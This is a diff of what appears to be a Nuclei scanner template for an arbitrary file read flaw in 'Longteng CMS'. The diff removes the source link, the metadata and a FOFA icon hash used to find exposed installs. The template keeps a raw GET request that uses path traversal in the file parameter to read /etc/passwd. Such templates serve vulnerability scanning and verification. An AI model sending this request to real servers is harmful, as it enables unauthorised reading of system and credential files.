@@ -3,12 +3,8 @@ info:
   name: 龙腾CMS  downloadFile存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bdk90nmiolia2cnv'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bdk90nmiolia2cnv
-    fofa: icon_hash="-803002403"
 http:
 - raw:
   - 'GET /api/file/downloadFile?file=../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
